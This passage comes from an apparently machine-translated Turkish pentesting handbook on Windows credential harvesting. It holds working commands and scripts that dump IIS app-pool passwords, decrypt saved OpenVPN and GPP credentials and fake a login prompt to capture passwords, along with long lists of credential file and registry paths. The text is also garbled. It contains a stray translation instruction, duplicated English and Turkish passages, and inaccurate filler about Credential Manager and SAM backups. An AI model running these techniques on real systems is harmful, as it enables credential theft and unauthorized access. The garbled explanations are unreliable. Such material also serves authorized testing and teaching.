The Remote Desktop Credential Manager is a Windows feature that allows users to save their remote desktop credentials for easy access. This feature can be useful for users who frequently connect to remote desktops and don't want to enter their credentials every time.

However, from a security perspective, this feature can be a potential vulnerability. If an attacker gains access to a user's account, they can easily retrieve the saved credentials from the Credential Manager and use them to gain unauthorized access to remote desktops.

#### **Attack Scenario**

To exploit this vulnerability, an attacker needs to gain access to a user's account on the target system. Once they have access, they can use the following steps to retrieve the saved credentials from the Credential Manager:

1. Open the Windows Credential Manager by searching for "Credential Manager" in the Start menu.
2. In the Credential Manager window, select the "Windows Credentials" tab.
3. Look for any saved credentials related to remote desktop connections.
4. Click on the credential entry to reveal the username and password.

With the retrieved credentials, the attacker can now use them to connect to remote desktops without the need for further authentication.

#### **Mitigation**

To mitigate the risk associated with the Remote Desktop Credential Manager, it is recommended to follow these best practices:

1. Avoid saving remote desktop credentials in the Credential Manager.
2. If saving credentials is necessary, ensure that strong and unique passwords are used.
3. Regularly review the saved credentials in the Credential Manager and remove any unnecessary entries.
4. Enable multi-factor authentication for remote desktop connections to add an extra layer of security.

By following these practices, users can reduce the risk of unauthorized access to their remote desktops through the exploitation of the Credential Manager feature.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **.rdg dosyalarını** şifre çözebilirsiniz.\
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok DPAPI anahtarını **çıkarabilirsiniz**.

### Yapışkan Notlar

İnsanlar genellikle Windows iş istasyonlarında StickyNotes uygulamasını kullanarak şifreler ve diğer bilgileri kaydederler, ancak bunun bir veritabanı dosyası olduğunun farkında değillerdir. Bu dosya `C:\Users\<kullanıcı>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranmaya ve incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur ve şifrelerin kurtarılabilmesi için Yönetici olmanız ve Yüksek Bütünlük seviyesinde çalışmanız gerektiğini unutmayın.\
Bu dosya varsa, yapılandırılmış bazı **kimlik bilgilerinin kurtarılması** mümkün olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) dosyasından çıkarılmıştır.
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin.\
Kurulum dosyaları **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçok dosya **DLL Yan Yükleme** açığına sahiptir (**Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Anahtarları

Putty, Windows işletim sistemlerinde kullanılan popüler bir SSH ve Telnet istemcisidir. Putty, SSH sunucularına bağlanırken kullanılan anahtarları depolamak için bir anahtar deposu kullanır. Bu anahtarlar, sunucuların kimlik doğrulamasını sağlamak için kullanılır.

Putty SSH anahtarları, genellikle Windows kayıt defterinde saklanır. Anahtarlar, her sunucu için ayrı ayrı kaydedilir ve sunucunun kimlik doğrulaması sırasında kullanılır.

Anahtarlar, genellikle aşağıdaki kayıt defteri anahtarlarında saklanır:

- HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys
- HKEY_USERS\<User SID>\Software\SimonTatham\PuTTY\SshHostKeys

Bu kayıt defteri anahtarlarında, sunucuların IP adresleri veya alan adları ile ilişkilendirilmiş anahtarlar bulunur. Anahtarlar, sunucunun kimlik doğrulaması sırasında kullanılan şifreleme algoritmalarını ve anahtar uzunluklarını içerir.

Putty SSH anahtarları, bir saldırganın sunucuya yetkisiz erişim sağlamasını engellemek için önemlidir. Bu nedenle, bu anahtarların güvenli bir şekilde saklanması ve yönetilmesi önemlidir.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt Defterinde SSH Anahtarları

SSH özel anahtarları, `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarının içine depolanabilir, bu yüzden burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer bu yolun içinde herhangi bir giriş bulursanız, muhtemelen kaydedilmiş bir SSH anahtarı olacaktır. Bu şifrelenmiş olarak depolanır, ancak [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi için buraya bakabilirsiniz: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve otomatik olarak başlamasını istiyorsanız, aşağıdaki komutu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Bu teknik artık geçerli değil gibi görünüyor. Bazı ssh anahtarları oluşturmayı denedim, onları `ssh-add` ile ekledim ve bir makineye ssh üzerinden giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kaydı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.
{% endhint %}

### Otomatik yapılandırma dosyaları
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Aşağıdaki içerik, bir hackleme kitabından alınmıştır ve Windows işletim sisteminde yerel ayrıcalık yükseltme tekniklerini açıklamaktadır. İlgili İngilizce metni Türkçe'ye çevirip aynı markdown ve html sözdizimini koruyarak çeviriyi yapmanız istenmektedir. Kod, hackleme teknikleri, hackleme kelimesi, bulut/SaaS platform adları (örneğin Workspace, aws, gcp...), 'sızıntı' kelimesi, pentesting ve markdown etiketleri gibi şeyleri çevirmeyin. Ayrıca çeviriye ekstra bir şey eklemeyin, sadece çeviriyi ve markdown sözdizimini kullanın.

```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum\_unattend_
```

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri

Windows işletim sisteminde, SAM ve SYSTEM dosyaları, yerel kullanıcı hesapları ve sistem yapılandırmasıyla ilgili önemli bilgileri içerir. Bu dosyaların yedeklenmesi, yerel ayrıcalık yükseltme saldırıları için önemli bir adımdır. SAM dosyası, yerel kullanıcı hesaplarının şifrelerini ve diğer kimlik bilgilerini içerirken, SYSTEM dosyası, işletim sistemi yapılandırması ve güvenlik ayarlarını içerir.

Yedekleme işlemi, SAM ve SYSTEM dosyalarının kopyalarını alarak gerçekleştirilir. Bu dosyalar, genellikle Windows kayıt defterinde bulunur. Yedekleme işlemi, yerel ayrıcalık yükseltme saldırıları sırasında bu dosyaların manipüle edilmesini önlemek için önemlidir.

Yedekleme işlemi için çeşitli araçlar ve yöntemler mevcuttur. Bu araçlar arasında `regedit`, `reg save`, `reg save hklm\sam`, `reg save hklm\system` gibi komutlar yer alır. Bu komutlar, SAM ve SYSTEM dosyalarının yedeklerini almak için kullanılabilir.

Yedekleme işlemi tamamlandıktan sonra, bu dosyaların güvenli bir şekilde saklanması önemlidir. Yedek dosyaların yetkisiz erişime karşı korunması ve şifrelenmesi gerekmektedir. Ayrıca, yedek dosyaların düzenli olarak güncellenmesi ve güvenli bir ortamda saklanması önemlidir.

Yerel ayrıcalık yükseltme saldırıları sırasında, SAM ve SYSTEM yedek dosyaları, saldırganın yerel ayrıcalıkları elde etmesine yardımcı olabilir. Bu nedenle, bu dosyaların yedeklenmesi ve güvenli bir şekilde saklanması, sistem güvenliği açısından kritik bir adımdır.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri

Cloud credentials refer to the authentication information used to access cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or other forms of authentication tokens.

Bulut kimlik bilgileri, bulut hizmetlerine ve kaynaklara erişmek için kullanılan kimlik doğrulama bilgilerini ifade eder. Bu kimlik bilgileri genellikle bir kullanıcı adı ve şifre, API anahtarları, erişim belirteçleri veya diğer kimlik doğrulama belirteçlerini içerir.

#### Protecting Cloud Credentials

#### Bulut Kimlik Bilgilerini Koruma

Protecting cloud credentials is crucial to prevent unauthorized access to your cloud resources. Here are some best practices to follow:

Bulut kimlik bilgilerini korumak, bulut kaynaklarınıza izinsiz erişimi önlemek için önemlidir. İşte takip edilmesi gereken bazı en iyi uygulamalar:

- **Use strong and unique passwords**: Ensure that your cloud account passwords are strong and not easily guessable. Use a combination of uppercase and lowercase letters, numbers, and special characters. Avoid using common words or personal information in your passwords.

- **Güçlü ve benzersiz şifreler kullanın**: Bulut hesabınızın şifrelerinin güçlü ve tahmin edilmesi zor olmasını sağlayın. Büyük harf, küçük harf, rakam ve özel karakterlerin bir kombinasyonunu kullanın. Şifrelerinizde yaygın kelimeleri veya kişisel bilgileri kullanmaktan kaçının.

- **Enable multi-factor authentication (MFA)**: Enable MFA for your cloud accounts whenever possible. This adds an extra layer of security by requiring a second form of authentication, such as a code sent to your mobile device, in addition to your password.

- **Çok faktörlü kimlik doğrulamayı (MFA) etkinleştirin**: Mümkün olduğunda bulut hesaplarınız için MFA'yı etkinleştirin. Bu, şifrenize ek olarak, mobil cihazınıza gönderilen bir kod gibi ikinci bir kimlik doğrulama formu gerektirerek ek bir güvenlik katmanı ekler.

- **Regularly rotate credentials**: Periodically change your cloud credentials, such as passwords and access keys, to minimize the risk of unauthorized access. Set a reminder to update your credentials at regular intervals.

- **Kimlik bilgilerini düzenli olarak değiştirin**: Yetkisiz erişim riskini en aza indirmek için şifrelerinizi ve erişim anahtarlarınızı düzenli olarak değiştirin. Kimlik bilgilerinizi düzenli aralıklarla güncellemek için bir hatırlatıcı ayarlayın.

- **Limit access privileges**: Grant access privileges only to the necessary users or roles. Avoid giving excessive permissions that could potentially be misused.

- **Erişim ayrıcalıklarını sınırlayın**: Sadece gerekli kullanıcılara veya rollerlere erişim ayrıcalıkları verin. Potansiyel olarak kötüye kullanılabilecek aşırı izinleri vermekten kaçının.

- **Monitor and audit**: Regularly monitor and audit your cloud accounts for any suspicious activities or unauthorized access attempts. Enable logging and review the logs to identify any potential security breaches.

- **İzleme ve denetleme**: Bulut hesaplarınızı düzenli olarak izleyin ve denetleyin, şüpheli faaliyetleri veya izinsiz erişim girişimlerini tespit etmek için kayıtları etkinleştirin ve inceleyin.

By following these best practices, you can enhance the security of your cloud credentials and protect your cloud resources from unauthorized access.

Bu en iyi uygulamaları takip ederek, bulut kimlik bilgilerinizin güvenliğini artırabilir ve bulut kaynaklarınızı izinsiz erişimden koruyabilirsiniz.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Bir dosya olan **SiteList.xml** arayın.

### Önbelleğe Alınmış GPP Şifresi

Daha önce, Grup İlkesi Tercihleri (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak, bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Grup İlkesi Nesneleri (GPO'lar) herhangi bir etki alanı kullanıcısı tarafından erişilebilirdi. İkinci olarak, bu GPP'lerdeki şifreler, genel olarak belgelenmiş bir varsayılan anahtar kullanılarak AES256 ile şifrelenmiş olsa da, herhangi bir yetkilendirilmiş kullanıcı tarafından çözülebilirdi. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine izin vererek ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, bir işlev geliştirildi. Bu işlev, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarar. Böyle bir dosya bulduğunda, işlev şifreyi çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP hakkında ve dosyanın konumu hakkında ayrıntılar içerir ve bu güvenlik açığının tespit edilmesi ve giderilmesine yardımcı olur.

Bu dosyaları aramak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ dizininde arayın:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Crackmapexec kullanarak şifreleri elde etmek:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

IIS Web Config, Internet Information Services Web Configuration, is a configuration file used by IIS to control the behavior of websites hosted on Windows servers. The web.config file is written in XML format and contains settings related to various aspects of website functionality, such as authentication, authorization, session management, and URL rewriting.

The web.config file is located in the root directory of the website and can be edited using a text editor or through the IIS Manager interface. It allows administrators to customize the behavior of their websites by modifying the values of different configuration elements.

Some common configuration elements found in the web.config file include:

- `<authentication>`: Specifies the authentication method used by the website, such as forms-based authentication or Windows authentication.
- `<authorization>`: Defines the access control rules for different users or groups, determining who can access specific resources.
- `<sessionState>`: Configures the session management settings, such as session timeout and session mode.
- `<httpHandlers>`: Registers custom HTTP handlers that process specific types of requests.
- `<httpModules>`: Registers custom HTTP modules that intercept and modify incoming requests or outgoing responses.
- `<rewrite>`: Configures URL rewriting rules to redirect or rewrite incoming URLs.

By modifying the web.config file, administrators can fine-tune the behavior of their websites and enhance security by implementing appropriate authentication and authorization mechanisms, enabling HTTPS, and configuring other security-related settings.

It is important to note that any changes made to the web.config file will require the IIS application pool to be restarted for the changes to take effect. Additionally, care should be taken when editing the web.config file, as incorrect modifications can lead to website errors or vulnerabilities.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

This is an example of a web.config file that contains credentials. The `DatabaseUsername` key has a value of "admin" and the `DatabasePassword` key has a value of "password123".
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri

OpenVPN, sanal özel ağ (VPN) bağlantıları için kullanılan bir açık kaynaklı yazılımdır. OpenVPN kimlik bilgileri, kullanıcıların OpenVPN sunucusuna erişmek için kullanılan kullanıcı adı ve şifreyi içerir. Bu kimlik bilgileri, güvenli bir şekilde saklanmalı ve yetkisiz erişimden korunmalıdır. Kimlik bilgileri sızdırıldığında, saldırganlar VPN sunucusuna yetkisiz erişim elde edebilir ve kullanıcının gizli verilerine erişebilir. Bu nedenle, OpenVPN kimlik bilgilerinin güvenli bir şekilde yönetilmesi önemlidir.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler

Logs (kayıtlar), bir sistemin faaliyetlerini izlemek ve sorunları tespit etmek için kullanılan önemli bir kaynaktır. Windows işletim sisteminde, olay günlükleri (event logs) adı verilen bir dizi kayıt bulunur. Bu günlükler, sistem, uygulama ve güvenlik olaylarını kaydetmek için kullanılır.

Windows işletim sistemindeki olay günlükleri aşağıdaki gibi sınıflandırılabilir:

- **Sistem Günlükleri**: Sistemle ilgili olayları kaydeder. Örneğin, sistem başlatma ve kapanma olayları, donanım hataları, sürücü sorunları gibi olaylar bu günlükte yer alır.
- **Uygulama Günlükleri**: Uygulamaların ürettiği olayları kaydeder. Örneğin, bir uygulamanın çökmesi, hatalar veya önemli olaylar bu günlükte yer alır.
- **Güvenlik Günlükleri**: Sistemdeki güvenlik olaylarını kaydeder. Örneğin, kullanıcı oturum açma denemeleri, yetkilendirme hataları veya güvenlik ihlalleri bu günlükte yer alır.

Bu günlükler, bir saldırganın sisteme erişimini izlemek ve potansiyel bir ayrıcalık yükseltme fırsatı bulmak için kullanılabilir. Saldırganlar, günlükleri inceleyerek zayıf noktaları ve güvenlik açıklarını tespit edebilirler.

Windows işletim sistemindeki günlükleri incelemek için aşağıdaki araçlar kullanılabilir:

- **Event Viewer**: Windows işletim sisteminde yerleşik olarak bulunan bir araçtır. Bu araç, olay günlüklerini görüntülemek ve analiz etmek için kullanılır.
- **PowerShell**: PowerShell komutları kullanılarak günlükleri sorgulamak ve analiz etmek mümkündür.
- **Third-party Araçlar**: Üçüncü taraf araçlar, daha gelişmiş günlük analizi ve izleme yetenekleri sunabilir.

Sistem günlüklerini düzenli olarak kontrol etmek ve anormal aktiviteleri tespit etmek, bir sistemdeki potansiyel ayrıcalık yükseltme saldırılarını önlemek için önemlidir.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Her zaman kullanıcıdan kimlik bilgilerini veya başka bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz (dikkat edin, müşteriden kimlik bilgilerini doğrudan istemek gerçekten risklidir):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içeren olası dosya adları**

Bilinen dosyalar, geçmişte bazen **açık metin** veya **Base64** ile **parolaları** içeriyordu.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tüm önerilen dosyalarda arama yapın:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin'de Kimlik Bilgileri

Kimlik bilgilerini içeren dosyaları bulmak için Bin'i kontrol etmelisiniz.

Birkaç program tarafından kaydedilen şifreleri kurtarmak için şunu kullanabilirsiniz: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Kayıt Defteri İçinde

Kimlik bilgileri içeren diğer olası kayıt defteri anahtarları
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Kayıttan openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox**'tan şifrelerin depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin, belki bazı **şifreler orada** depolanmıştır.

Tarayıcılardan şifreleri çıkarmak için araçlar:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Üzerine Yazma**

**Component Object Model (COM)**, Windows işletim sistemi içinde yer alan ve farklı dillerdeki yazılım bileşenleri arasında **iletişim** sağlayan bir teknolojidir. Her COM bileşeni, bir sınıf kimliği (CLSID) ile tanımlanır ve her bileşen, bir veya daha fazla arayüzü, arayüz kimlikleri (IID) ile tanımlanan işlevselliği sunar.

COM sınıfları ve arayüzleri, **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve **HKEY\_**_**CLASSES\_**_**ROOT\Interface** altında kaydedilir. Bu kayıt defteri, **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** birleştirilerek oluşturulur ve **HKEY\_**_**CLASSES\_**_**ROOT** olarak adlandırılır.

Bu kayıt defterinin CLSID'lerinin içinde, farklı bir kullanıcı tarafından çalıştırılacak olan bir DLL'ye işaret eden bir **varsayılan değer** içeren **InProcServer32** adlı bir alt kayıt defteri bulunabilir ve **ThreadingModel** adında bir değer bulunur. Bu değer, **Apartment** (Tek İş Parçacıklı), **Free** (Çoklu İş Parçacıklı), **Both** (Tek veya Çoklu) veya **Neutral** (İş Parçacığı Nötr) olabilir.

![](<../../.gitbook/assets/image (638).png>)

Temel olarak, **yürütülecek olan DLL'lerden herhangi birini üzerine yazabilirseniz**, farklı bir kullanıcı tarafından yürütülecekse **ayrıcalıkları yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şu adrese bakın:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Dosyalarda ve kayıt defterinde genel şifre araması**

**Dosya içeriğinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla dosya arama**

Bir sistemde belirli bir dosya adını aramak için aşağıdaki adımları izleyebilirsiniz:

1. Komut istemini açın.
2. `dir /s /b C:\` komutunu kullanarak, `C:\` sürücüsünde veya belirli bir dizindeki tüm dosyaları listeleme işlemini gerçekleştirin. `/s` parametresi alt dizinlerde arama yapılacağını belirtirken, `/b` parametresi ise yalnızca dosya adlarını listelemenizi sağlar.
3. Dosya adını aradığınızı belirtmek için `findstr` komutunu kullanın. Örneğin, `findstr /i /c:"dosya_adı"` komutunu kullanarak, `dosya_adı` olarak belirtilen dosyayı arayabilirsiniz. `/i` parametresi büyük/küçük harf duyarlılığını kapatırken, `/c` parametresi aranacak metni belirtir.

Bu adımları takip ederek, belirli bir dosya adını arayabilir ve sonuçları elde edebilirsiniz.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adları ve parolaları arayın**

